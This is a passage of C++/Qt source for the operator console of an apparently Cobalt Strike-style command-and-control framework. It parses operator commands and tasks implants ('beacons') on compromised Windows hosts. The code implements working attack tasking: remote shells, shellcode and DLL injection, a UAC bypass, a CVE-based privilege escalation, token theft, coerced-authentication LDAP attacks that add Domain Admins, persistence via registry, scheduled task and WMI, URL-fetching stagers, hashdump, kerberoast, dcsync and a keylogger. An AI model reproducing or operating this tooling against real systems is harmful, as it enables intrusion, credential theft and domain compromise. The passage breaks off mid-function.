        const auto* br = sessions_model_->findById(beaconId);
        ae.beacon_name = br ? (br->user + "@" + br->host) : beaconId;
        ae.command    = cmd;
        audit_model_->append(ae);
    }

    // Сохраняем текст команды — первый taskBeacon() подхватит его для audit.
    client_->setNextCmdText(cmd);

    // Parse basic commands: shell <args>, sleep <ms> [jitter], exit, pwd, cd, ls [p]
    auto parts = cmd.trimmed();
    if (parts.isEmpty()) return;
    auto sp = parts.indexOf(' ');
    QString verb = sp < 0 ? parts : parts.left(sp);
    QString tail = sp < 0 ? QString{} : parts.mid(sp + 1);

    // Скриптовые команды (зарегистрированные из Lua через command()).
    if (script_engine_ && script_engine_->hasCommand(verb)) {
        script_engine_->execCommand(verb, beaconId, tail);
        return;
    }

    if (verb == "shell" && tail.isEmpty()) {
        // Enter interactive shell mode — send empty IShell to start cmd.exe on beacon.
        console_->enterInteractiveShell();
        // Send a single newline to start cmd.exe and get the initial prompt.
        client_->taskBeacon(beaconId, proto::TaskOp::IShell, QByteArray("\n"));
        return;
    } else if (verb == "shell") {
        client_->taskBeacon(beaconId, proto::TaskOp::Shell, tail.toUtf8());
    } else if (verb == "ps") {
        client_->taskBeacon(beaconId, proto::TaskOp::Ps, {});
    } else if (verb == "pwd") {
        client_->taskBeacon(beaconId, proto::TaskOp::Pwd, {});
    } else if (verb == "ls") {
        client_->taskBeacon(beaconId, proto::TaskOp::Ls, tail.toUtf8());
    } else if (verb == "cd") {
        client_->taskBeacon(beaconId, proto::TaskOp::Cd, tail.toUtf8());
    } else if (verb == "exit") {
        client_->taskBeacon(beaconId, proto::TaskOp::Exit, {});
    } else if (verb == "kill") {
        client_->taskBeacon(beaconId, proto::TaskOp::Kill, {});
    } else if (verb == "sleep") {
        auto sparts = tail.split(' ', Qt::SkipEmptyParts);
        quint32 ms = sparts.size() > 0 ? sparts[0].toUInt() : 5000;
        quint8  jt = sparts.size() > 1 ? static_cast<quint8>(sparts[1].toUInt()) : 0;
        QByteArray pl;
        pl.append(static_cast<char>((ms >> 24) & 0xFF));
        pl.append(static_cast<char>((ms >> 16) & 0xFF));
        pl.append(static_cast<char>((ms >>  8) & 0xFF));
        pl.append(static_cast<char>( ms        & 0xFF));
        pl.append(static_cast<char>(jt));
        client_->taskBeacon(beaconId, proto::TaskOp::Sleep, pl);
    } else if (verb == "download") {
        // Синтаксис: download <remote_full_path> <local_full_path>
        // Полные пути; пути с пробелами — в кавычках.
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError("usage: download <remote_full_path> <local_full_path>");
            return;
        }
        const QString remote = args[0];
        const QString local  = args[1];
        const auto rpc = client_->taskBeacon(beaconId, proto::TaskOp::Download,
                                             remote.toUtf8());
        dl_by_rpc_.insert(rpc, local);
        downloads_model_->addPending(rpc, beaconId, remote, local);
        console_->appendOutput(QString("download requested: %1 -> %2")
                                   .arg(remote, local));
    } else if (verb == "upload") {
        // Синтаксис: upload <local_full_path> <remote_full_path>
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError("usage: upload <local_full_path> <remote_full_path>");
            return;
        }
        const QString local  = args[0];
        const QString remote = args[1];
        QFile f(local);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("upload: can't read " + local);
            return;
        }
        // Payload per chunk: [u32 LE path_len][path bytes][u64 LE offset][chunk data]
        const QByteArray rpath = remote.toUtf8();
        const quint32 plen = static_cast<quint32>(rpath.size());
        const qint64 fileSize = f.size();
        static constexpr qint64 CHUNK = 512 * 1024;
        qint64 offset = 0;
        int chunks = 0;
        while (true) {
            const QByteArray chunk = f.read(CHUNK);
            if (chunk.isEmpty()) break;
            QByteArray pl;
            pl.reserve(4 + rpath.size() + 8 + chunk.size());
            pl.append(static_cast<char>( plen        & 0xFF));
            pl.append(static_cast<char>((plen >>  8) & 0xFF));
            pl.append(static_cast<char>((plen >> 16) & 0xFF));
            pl.append(static_cast<char>((plen >> 24) & 0xFF));
            pl.append(rpath);
            const quint64 off = static_cast<quint64>(offset);
            pl.append(static_cast<char>( off        & 0xFF));
            pl.append(static_cast<char>((off >>  8) & 0xFF));
            pl.append(static_cast<char>((off >> 16) & 0xFF));
            pl.append(static_cast<char>((off >> 24) & 0xFF));
            pl.append(static_cast<char>((off >> 32) & 0xFF));
            pl.append(static_cast<char>((off >> 40) & 0xFF));
            pl.append(static_cast<char>((off >> 48) & 0xFF));
            pl.append(static_cast<char>((off >> 56) & 0xFF));
            pl.append(chunk);
            client_->taskBeacon(beaconId, proto::TaskOp::Upload, pl);
            offset += chunk.size();
            ++chunks;
        }
        f.close();
        console_->appendOutput(QString("upload queued: %1 (%2 bytes, %3 chunk(s)) -> %4")
                                   .arg(local).arg(fileSize).arg(chunks).arg(remote));
    } else if (verb == "rm") {
        if (tail.isEmpty()) { console_->appendError("usage: rm <path>"); return; }
        client_->taskBeacon(beaconId, proto::TaskOp::Rm, tail.toUtf8());
    } else if (verb == "cp" || verb == "mv") {
        // Payload beacon'a: "<src>\0<dst>" — см. cmd_fs.c
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError(QString("usage: %1 <src> <dst>").arg(verb));
            return;
        }
        QByteArray pl = args[0].toUtf8();
        pl.append('\0');
        pl.append(args[1].toUtf8());
        client_->taskBeacon(beaconId,
            verb == "cp" ? proto::TaskOp::Cp : proto::TaskOp::Mv, pl);
    } else if (verb == "run") {
        // Прямой запуск процесса без cmd.exe (CreateProcessW).
        if (tail.isEmpty()) { console_->appendError("usage: run <cmdline>"); return; }
        client_->taskBeacon(beaconId, proto::TaskOp::Run, tail.toUtf8());
    } else if (verb == "ldap_addda") {
        // Синтаксис: ldap_addda <dc_ip> <beacon_ip> <user_dn> <group_dn> [listen_port=445]
        // dc_ip     — IP контроллера домена (цель EfsRpc + LDAP)
        // beacon_ip — IP машины с запущенным beacon (куда DC$ аутентифицируется)
        // user_dn   — DN добавляемого пользователя
        // group_dn  — DN группы (обычно Domain Admins)
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 4) {
            console_->appendError("usage: ldap_addda <dc_ip> <beacon_ip> <user_dn> <group_dn> [listen_port=8445]");
            return;
        }
        quint32 port = (args.size() >= 5) ? args[4].toUInt() : 445;
        kv::Writer w;
        w.put_str("dc_ip",       args[0].toStdString());
        w.put_str("beacon_ip",   args[1].toStdString());
        w.put_str("user_dn",     args[2].toStdString());
        w.put_str("group_dn",    args[3].toStdString());
        w.put_u32("listen_port", port);
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::LdapAddDA, pl);
        console_->appendOutput(
            QString("ldap_addda -> dc=%1 beacon=%2 port=%3").arg(args[0], args[1]).arg(port));
    } else if (verb == "ldap_rbcd") {
        // Синтаксис: ldap_rbcd <dc_ip> <beacon_ip> <coerce_ip> <target_dn> <attacker_sid> [listen_port=445]
        // dc_ip       — IP контроллера домена (LDAP-цель)
        // beacon_ip   — IP машины с beacon (SMB-листенер)
        // coerce_ip   — IP TARGET-а (member-сервер/второй DC), кого принуждаем к аутентификации
        // target_dn   — DN объекта компьютера TARGET-а в AD (куда пишем RBCD)
        // attacker_sid — SID учётки которой даём право делегирования
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 5) {
            console_->appendError("usage: ldap_rbcd <dc_ip> <beacon_ip> <coerce_ip> <target_dn> <attacker_sid> [listen_port=445]");
            return;
        }
        quint32 port = (args.size() >= 6) ? args[5].toUInt() : 445;
        kv::Writer w;
        w.put_str("dc_ip",        args[0].toStdString());
        w.put_str("beacon_ip",    args[1].toStdString());
        w.put_str("coerce_ip",    args[2].toStdString());
        w.put_str("target_dn",    args[3].toStdString());
        w.put_str("attacker_sid", args[4].toStdString());
        w.put_u32("listen_port",  port);
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::LdapRbcd, pl);
        console_->appendOutput(
            QString("ldap_rbcd -> dc=%1 beacon=%2 coerce=%3 target=%4")
                .arg(args[0], args[1], args[2], args[3]));
    } else if (verb == "migrate") {
        // Синтаксис: migrate <pid>
        bool okPid = false;
        quint32 pid = tail.trimmed().toUInt(&okPid);
        if (!okPid || pid == 0) {
            console_->appendError("usage: migrate <pid>");
            return;
        }
        kv::Writer w;
        w.put_u32("pid", pid);
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::Migrate, pl);
        console_->appendOutput(QString("migrate -> pid=%1").arg(pid));
    } else if (verb == "inject" || verb == "inject_apc") {
        // Синтаксис: inject <pid> <local_shellcode_file>
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError(QString("usage: %1 <pid> <shellcode_file>").arg(verb));
            return;
        }
        bool okPid = false;
        quint32 pid = args[0].toUInt(&okPid);
        if (!okPid || pid == 0) {
            console_->appendError("inject: bad pid"); return;
        }
        QFile f(args[1]);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("inject: can't read " + args[1]); return;
        }
        const QByteArray sc = f.readAll();
        f.close();
        kv::Writer w;
        w.put_u32("pid", pid);
        w.put_bytes("sc",
            {reinterpret_cast<const std::uint8_t*>(sc.constData()),
             static_cast<std::size_t>(sc.size())});
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId,
            verb == "inject" ? proto::TaskOp::InjectThread
                             : proto::TaskOp::InjectApc, pl);
        console_->appendOutput(QString("%1 -> pid=%2 sc=%3 bytes")
                                   .arg(verb).arg(pid).arg(sc.size()));
    } else if (verb == "spawnto") {
        // Синтаксис: spawnto <local_shellcode_file> [spawn_to_full_path]
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 1 || args.size() > 2) {
            console_->appendError("usage: spawnto <shellcode_file> [spawn_to_path]");
            return;
        }
        QFile f(args[0]);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("spawnto: can't read " + args[0]); return;
        }
        const QByteArray sc = f.readAll();
        f.close();
        kv::Writer w;
        if (args.size() == 2) w.put_str("spawn_to", args[1].toStdString());
        w.put_bytes("sc",
            {reinterpret_cast<const std::uint8_t*>(sc.constData()),
             static_cast<std::size_t>(sc.size())});
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::SpawnTo, pl);
        console_->appendOutput(QString("spawnto queued, sc=%1 bytes").arg(sc.size()));
    } else if (verb == "modstomp") {
        // Синтаксис: modstomp <local_shellcode_file> [dll_full_path]
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 1 || args.size() > 2) {
            console_->appendError("usage: modstomp <shellcode_file> [dll_path]");
            return;
        }
        QFile f(args[0]);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("modstomp: can't read " + args[0]); return;
        }
        const QByteArray sc = f.readAll();
        f.close();
        kv::Writer w;
        if (args.size() == 2) w.put_str("dll", args[1].toStdString());
        w.put_bytes("sc",
            {reinterpret_cast<const std::uint8_t*>(sc.constData()),
             static_cast<std::size_t>(sc.size())});
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::ModStomp, pl);
        console_->appendOutput(QString("modstomp queued, sc=%1 bytes").arg(sc.size()));
    } else if (verb == "inject_dll") {
        // Синтаксис: inject_dll <dll_path> [cmd_args...] [--spawnto <PID>]
        //   без --spawnto : fork & run (новый жертвенный процесс, вывод через пайп)
        //   --spawnto PID : инъекция в существующий процесс по PID (вывод не захватывается)
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 1) {
            console_->appendError("usage: inject_dll <dll_path> [args...] [--spawnto <PID>]");
            return;
        }
        QFile f(args[0]);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("inject_dll: can't read " + args[0]); return;
        }
        const QByteArray dll = f.readAll();
        f.close();

        // Разбираем аргументы: ищем --spawnto <PID>, остальное — команда для DLL.
        quint32 targetPid = 0;
        QStringList cmdParts;
        for (int i = 1; i < args.size(); ++i) {
            if (args[i] == QString::fromLatin1("--spawnto") && i + 1 < args.size()) {
                bool ok = false;
                targetPid = args[++i].toUInt(&ok);
                if (!ok || targetPid == 0) {
                    console_->appendError("inject_dll: --spawnto requires a valid PID");
                    return;
                }
            } else {
                cmdParts << args[i];
            }
        }

        kv::Writer w;
        w.put_bytes("dll",
            {reinterpret_cast<const std::uint8_t*>(dll.constData()),
             static_cast<std::size_t>(dll.size())});
        if (!cmdParts.isEmpty())
            w.put_str("args", cmdParts.join(QChar(' ')).toStdString());
        if (targetPid != 0)
            w.put_u32("pid", targetPid);

        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::InjectDll, pl);

        if (targetPid)
            console_->appendOutput(QString("inject_dll queued → PID %1 (%2 bytes)")
                                       .arg(targetPid).arg(dll.size()));
        else
            console_->appendOutput(QString("inject_dll queued → fork&run (%1 bytes)")
                                       .arg(dll.size()));
    } else if (verb == "bof") {
        // Синтаксис: bof <coff_file> [entry] [-- format arg1 arg2 ...]
        //   format: i=int32, s=int16, z=ANSI-строка, Z=wide-строка, b=файл(бинарные)
        // Payload: [u32 entry_len][entry][u32 args_len][args][COFF]
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 1) {
            console_->appendError("usage: bof <coff_file> [entry] [-- format arg1 arg2 ...]"); return;
        }
        // Определяем архитектуру бикона для автоматического выбора BOF.
        QString beaconArch = "x64"; // по умолчанию
        if (auto* br = sessions_model_->findById(beaconId))
            beaconArch = br->arch.isEmpty() ? "x64" : br->arch;
        const QString archSuffix = (beaconArch == "x86") ? ".x86.o" : ".x64.o";
        const QString altSuffix  = (beaconArch == "x86") ? ".x64.o" : ".x86.o";

        // Автопоиск BOF: если файл не найден напрямую, ищем по имени
        // во всей папке bof/ рядом с исполняемым файлом клиента.
        // Приоритет: правильная архитектура > .o > любая архитектура.
        QString bofPath = args[0];
        if (!QFile::exists(bofPath)) {
            const QString bofDir = QCoreApplication::applicationDirPath() + "/bof";
            const QString name = QFileInfo(bofPath).fileName();

            // Сначала ищем BOF подходящей архитектуры.
            QStringList primaryCandidates = { name };
            if (!name.endsWith(".o", Qt::CaseInsensitive)) {
                primaryCandidates << name + archSuffix << name + ".o";
            }
            QDirIterator it(bofDir, primaryCandidates,
                            QDir::Files, QDirIterator::Subdirectories);
            if (it.hasNext()) {
                bofPath = it.next();
            } else if (!name.endsWith(".o", Qt::CaseInsensitive)) {
                // Не нашли — пробуем другую архитектуру (всё лучше чем ничего,
                // бикон сам отвергнет если Machine не совпадёт).
                QStringList fallback = { name + altSuffix };
                QDirIterator it2(bofDir, fallback,
                                 QDir::Files, QDirIterator::Subdirectories);
                if (it2.hasNext()) {
                    bofPath = it2.next();
                    console_->appendError(
                        QString("bof: BOF for %1 not found, using %2 (architecture may not match)")
                            .arg(beaconArch, QFileInfo(bofPath).fileName()));
                }
            }
        }

        QFile f(bofPath);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("bof: can't find " + args[0]); return;
        }
        const QByteArray coff = f.readAll();
        f.close();

        // Определяем entry и позицию разделителя "--".
        QByteArray entry("go");
        int dashIdx = -1;
        for (int i = 1; i < args.size(); ++i) {
            if (args[i] == "--") { dashIdx = i; break; }
        }
        if (dashIdx == -1 && args.size() >= 2) {
            // Нет "--" — второй аргумент = entry (обратная совместимость).
            entry = args[1].toUtf8();
        } else if (dashIdx >= 2) {
            entry = args[1].toUtf8();
        }

        // Пакуем аргументы BOF в CS-совместимый формат BeaconDataParse.
        QByteArray packedArgs;
        if (dashIdx >= 0 && dashIdx + 2 < args.size()) {
            const QString& fmt = args[dashIdx + 1];
            int ai = dashIdx + 2; // индекс первого значения
            for (int fi = 0; fi < fmt.size() && ai < args.size(); ++fi, ++ai) {
                QChar fc = fmt[fi];
                if (fc == 'i') {
                    // int32 LE — 4 сырых байта (BeaconDataInt читает 4 байта).
                    qint32 v = args[ai].toInt();
                    packedArgs.append(static_cast<char>( v        & 0xFF));
                    packedArgs.append(static_cast<char>((v >>  8) & 0xFF));
                    packedArgs.append(static_cast<char>((v >> 16) & 0xFF));
                    packedArgs.append(static_cast<char>((v >> 24) & 0xFF));
                } else if (fc == 's') {
                    // short16 LE — 2 сырых байта (BeaconDataShort читает 2 байта).
                    qint16 v = static_cast<qint16>(args[ai].toInt());
                    packedArgs.append(static_cast<char>( v       & 0xFF));
                    packedArgs.append(static_cast<char>((v >> 8) & 0xFF));
                } else if (fc == 'z') {
                    // ANSI-строка: [u32 len][data\0] — BeaconDataExtract.
                    QByteArray s = args[ai].toUtf8();
                    s.append('\0');
                    quint32 slen = static_cast<quint32>(s.size());
                    packedArgs.append(static_cast<char>( slen        & 0xFF));
                    packedArgs.append(static_cast<char>((slen >>  8) & 0xFF));
                    packedArgs.append(static_cast<char>((slen >> 16) & 0xFF));
                    packedArgs.append(static_cast<char>((slen >> 24) & 0xFF));
                    packedArgs.append(s);
                } else if (fc == 'Z') {
                    // Wide-строка: [u32 byte_len][wchar_t data\0] — BeaconDataExtract.
                    QString s = args[ai];
                    // Конвертируем в UTF-16LE + null-terminator.
                    QByteArray wbuf;
                    for (int ci = 0; ci < s.size(); ++ci) {
                        quint16 wc = s[ci].unicode();
                        wbuf.append(static_cast<char>(wc & 0xFF));
                        wbuf.append(static_cast<char>((wc >> 8) & 0xFF));
                    }
                    wbuf.append('\0'); wbuf.append('\0'); // null wchar_t
                    quint32 wlen = static_cast<quint32>(wbuf.size());
                    packedArgs.append(static_cast<char>( wlen        & 0xFF));
                    packedArgs.append(static_cast<char>((wlen >>  8) & 0xFF));
                    packedArgs.append(static_cast<char>((wlen >> 16) & 0xFF));
                    packedArgs.append(static_cast<char>((wlen >> 24) & 0xFF));
                    packedArgs.append(wbuf);
                } else if (fc == 'b') {
                    // Бинарный файл: [u32 len][bytes] — BeaconDataExtract.
                    QFile bf(args[ai]);
                    if (!bf.open(QIODevice::ReadOnly)) {
                        console_->appendError("bof: can't read arg file " + args[ai]); return;
                    }
                    QByteArray blob = bf.readAll();
                    bf.close();
                    quint32 blen = static_cast<quint32>(blob.size());
                    packedArgs.append(static_cast<char>( blen        & 0xFF));
                    packedArgs.append(static_cast<char>((blen >>  8) & 0xFF));
                    packedArgs.append(static_cast<char>((blen >> 16) & 0xFF));
                    packedArgs.append(static_cast<char>((blen >> 24) & 0xFF));
                    packedArgs.append(blob);
                } else {
                    console_->appendError(QString("bof: unknown format char '%1'").arg(fc)); return;
                }
            }
        }

        const quint32 elen = static_cast<quint32>(entry.size());
        const quint32 alen = static_cast<quint32>(packedArgs.size());
        QByteArray pl;
        pl.reserve(4 + entry.size() + 4 + packedArgs.size() + coff.size());
        // entry_len + entry
        pl.append(static_cast<char>( elen        & 0xFF));
        pl.append(static_cast<char>((elen >>  8) & 0xFF));
        pl.append(static_cast<char>((elen >> 16) & 0xFF));
        pl.append(static_cast<char>((elen >> 24) & 0xFF));
        pl.append(entry);
        // args_len + args
        pl.append(static_cast<char>( alen        & 0xFF));
        pl.append(static_cast<char>((alen >>  8) & 0xFF));
        pl.append(static_cast<char>((alen >> 16) & 0xFF));
        pl.append(static_cast<char>((alen >> 24) & 0xFF));
        pl.append(packedArgs);
        // COFF
        pl.append(coff);
        client_->taskBeacon(beaconId, proto::TaskOp::Bof, pl);
        console_->appendOutput(QString("bof queued: %1 entry=%2 coff=%3 args=%4 bytes")
                                   .arg(args[0], QString::fromUtf8(entry))
                                   .arg(coff.size()).arg(alen));
    } else if (verb == "execute-assembly") {
        // Синтаксис: execute-assembly <local_path.exe> [args...]
        // Сборка читается с диска оператора и отправляется в payload (KV: pe + args).
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 1) {
            console_->appendError("usage: execute-assembly <path.exe> [args...]"); return;
        }
        QFile f(args[0]);
        if (!f.open(QIODevice::ReadOnly)) {
            console_->appendError("execute-assembly: can't read " + args[0]); return;
        }
        const QByteArray pe = f.readAll();
        f.close();
        // Аргументы для Main(string[]) — склеиваем хвост через пробел.
        QString joined;
        for (int i = 1; i < args.size(); ++i) {
            if (i > 1) joined += QChar(' ');
            joined += args[i];
        }
        kv::Writer w;
        w.put_bytes("pe",
            {reinterpret_cast<const std::uint8_t*>(pe.constData()),
             static_cast<std::size_t>(pe.size())});
        if (!joined.isEmpty()) w.put_str("args", joined.toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::ExeAsm, pl);
        console_->appendOutput(QString("execute-assembly queued: %1 (%2 bytes) args=\"%3\"")
                                   .arg(args[0]).arg(pe.size()).arg(joined));
    } else if (verb == "tcp_pivot") {
        // Синтаксис: tcp_pivot <host> <port>
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError("usage: tcp_pivot <host> <port>"); return;
        }
        bool okPort = false;
        quint32 port = args[1].toUInt(&okPort);
        if (!okPort) { console_->appendError("tcp_pivot: bad port"); return; }
        kv::Writer w;
        w.put_str("host", args[0].toStdString());
        w.put_u32("port", port);
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::TcpPivot, pl);
        console_->appendOutput(QString("tcp_pivot queued -> %1:%2")
                                   .arg(args[0]).arg(port));
    } else if (verb == "priv_all") {
        client_->taskBeacon(beaconId, proto::TaskOp::PrivAll, {});
    } else if (verb == "steal_token") {
        client_->taskBeacon(beaconId, proto::TaskOp::TokenSteal, tail.toUtf8());
    } else if (verb == "make_token") {
        client_->taskBeacon(beaconId, proto::TaskOp::TokenMake, tail.toUtf8());
    } else if (verb == "rev2self") {
        client_->taskBeacon(beaconId, proto::TaskOp::TokenRev, {});
    } else if (verb == "getuid") {
        client_->taskBeacon(beaconId, proto::TaskOp::TokenGetuid, {});
    } else if (verb == "privesc_admin") {
        client_->taskBeacon(beaconId, proto::TaskOp::PrivescAdmin, {});
        console_->appendOutput("privesc_admin queued (UAC bypass via fodhelper)");
    } else if (verb == "privesc_system") {
        client_->taskBeacon(beaconId, proto::TaskOp::PrivescSystem, {});
        console_->appendOutput("privesc_system queued (winlogon token theft)");
    } else if (verb == "privesc_plasma") {
        client_->taskBeacon(beaconId, proto::TaskOp::PrivescPlasma, {});
        console_->appendOutput("privesc_plasma queued (CVE-2020-17103 CfAbortOperation race)");
    } else if (verb == "screenshot") {
        // Снимок экрана. Ответ приходит как RESP_FILE — сохраняем в Downloads.
        QString ts       = QDateTime::currentDateTime().toString("yyyyMMdd_HHmmss");
        QString desktop  = QStandardPaths::writableLocation(QStandardPaths::DesktopLocation);
        QString localPath = desktop + "/screenshot_" + beaconId + "_" + ts + ".bmp";
        auto rpcId = client_->taskBeacon(beaconId, proto::TaskOp::Screenshot, {});
        dl_by_rpc_.insert(rpcId, localPath);
        downloads_model_->addPending(rpcId, beaconId, "screenshot", localPath);
        console_->appendOutput(QString("screenshot queued -> %1").arg(localPath));
    } else if (verb == "persist_reg") {
        // Синтаксис: persist_reg <name> <path>
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError("usage: persist_reg <name> <path>");
            return;
        }
        kv::Writer w;
        w.put_str("name", args[0].toStdString());
        w.put_str("path", args[1].toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::PersistReg, pl);
        console_->appendOutput(QString("persist_reg -> HKCU\\Run\\%1 = %2").arg(args[0], args[1]));
    } else if (verb == "persist_task") {
        // Синтаксис: persist_task <name> <path>
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError("usage: persist_task <name> <path>");
            return;
        }
        kv::Writer w;
        w.put_str("name", args[0].toStdString());
        w.put_str("path", args[1].toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::PersistTask, pl);
        console_->appendOutput(QString("persist_task -> Scheduled Task '%1' = %2")
                                   .arg(args[0], args[1]));
    } else if (verb == "persist_wmi") {
        // Синтаксис: persist_wmi <name> <interval_sec> <exe_path>
        // Клиент сам генерирует VBScript: CreateObject("WScript.Shell").Run "<exe>",0
        // Пример:
        //   persist_wmi co2h 60 C:\Temp\beacon64.exe
        int p1 = tail.indexOf(' ');
        if (p1 < 0) {
            console_->appendError("usage: persist_wmi <name> <interval_sec> <exe_path>");
            return;
        }
        QString nameArg = tail.left(p1).trimmed();
        QString rest    = tail.mid(p1 + 1).trimmed();
        int p2 = rest.indexOf(' ');
        if (p2 < 0 || nameArg.isEmpty()) {
            console_->appendError("usage: persist_wmi <name> <interval_sec> <exe_path>");
            return;
        }
        QString ivlStr  = rest.left(p2).trimmed();
        QString exePath = rest.mid(p2 + 1).trimmed();
        if (exePath.isEmpty()) {
            console_->appendError("usage: persist_wmi <name> <interval_sec> <exe_path>");
            return;
        }
        bool ok = false;
        quint32 ivl = ivlStr.toUInt(&ok);
        if (!ok || ivl == 0) ivl = 60;
        // Генерируем VBScript: запускает exe скрытно (windowStyle=0)
        QString script = QString("CreateObject(\"WScript.Shell\").Run \"%1\",0").arg(exePath);
        kv::Writer w;
        w.put_str("name",     nameArg.toStdString());
        w.put_str("script",   script.toStdString());
        w.put_u32("interval", ivl);
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::PersistWmi, pl);
        console_->appendOutput(
            QString("persist_wmi -> '%1' WITHIN %2s -> %3")
                .arg(nameArg).arg(ivl).arg(exePath));
    } else if (verb == "stager") {
        // Синтаксис: stager <lnk|hta|vbs|wsf|iso|chm> <url> <out_path> [--rm-after]
        // Payload: url\0out_path\0flags (1 байт флагов)
        auto args = QProcess::splitCommand(tail);

        bool rmAfter = args.removeAll("--rm-after") > 0;

        if (args.size() != 3) {
            console_->appendError(
                "usage: stager <lnk|hta|vbs|wsf|iso|chm> <url> <out_path> [--rm-after]");
            return;
        }
        const QString type = args[0].toLower();

        static const QMap<QString, proto::TaskOp> stagerOps = {
            {"lnk", proto::TaskOp::StagerLnk},
            {"hta", proto::TaskOp::StagerHta},
            {"vbs", proto::TaskOp::StagerVbs},
            {"wsf", proto::TaskOp::StagerWsf},
            {"iso", proto::TaskOp::StagerIso},
            {"chm", proto::TaskOp::StagerChm},
        };
        if (!stagerOps.contains(type)) {
            console_->appendError(
                "unknown stager type: " + type + "; use: lnk|hta|vbs|wsf|iso|chm");
            return;
        }

        QByteArray pl;
        pl.append(args[1].toUtf8());   // url
        pl.append('\0');
        pl.append(args[2].toUtf8());   // out_path
        pl.append('\0');
        pl.append(rmAfter ? '\x01' : '\x00');

        client_->taskBeacon(beaconId, stagerOps[type], pl);
        const QString suffix = rmAfter ? " (--rm-after)" : "";
        console_->appendOutput(
            QString("stager %1 queued -> %2%3").arg(type, args[2], suffix));
    } else if (verb == "hashdump") {
        client_->taskBeacon(beaconId, proto::TaskOp::HashDump, tail.toUtf8());
        console_->appendOutput(tail == "2" ? "hashdump (mode 2) queued" : "hashdump queued");
    } else if (verb == "kerberoast") {
        // Синтаксис: kerberoast [domain]
        // Без аргумента beacon берёт домен из USERDNSDOMAIN.
        kv::Writer w;
        if (!tail.isEmpty())
            w.put_str("domain", tail.trimmed().toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::Kerberoast, pl);
        console_->appendOutput(tail.isEmpty()
            ? QString("kerberoast queued (current domain)")
            : QString("kerberoast -> %1").arg(tail.trimmed()));
    } else if (verb == "adcs_enum") {
        // Синтаксис: adcs_enum [domain]
        // Проверяет ESC1-8; без аргумента берёт домен из USERDNSDOMAIN.
        kv::Writer w;
        if (!tail.isEmpty())
            w.put_str("domain", tail.trimmed().toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::AdcsEnum, pl);
        console_->appendOutput(tail.isEmpty()
            ? QString("adcs_enum queued (current domain)")
            : QString("adcs_enum -> %1").arg(tail.trimmed()));
    } else if (verb == "dcsync") {
        // Синтаксис: dcsync <domain> <username>
        auto args = QProcess::splitCommand(tail);
        if (args.size() != 2) {
            console_->appendError("usage: dcsync <domain> <username>");
            return;
        }
        kv::Writer w;
        w.put_str("domain", args[0].toStdString());
        w.put_str("user",   args[1].toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::DcSync, pl);
        console_->appendOutput(QString("dcsync -> %1\\%2").arg(args[0], args[1]));
    } else if (verb == "keylogger") {
        // Синтаксис: keylogger start | dump | stop
        auto args = QProcess::splitCommand(tail);
        if (args.isEmpty() ||
            (args[0] != "start" && args[0] != "dump" && args[0] != "stop")) {
            console_->appendError("usage: keylogger start | dump | stop");
            return;
        }
        kv::Writer w;
        w.put_str("cmd", args[0].toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
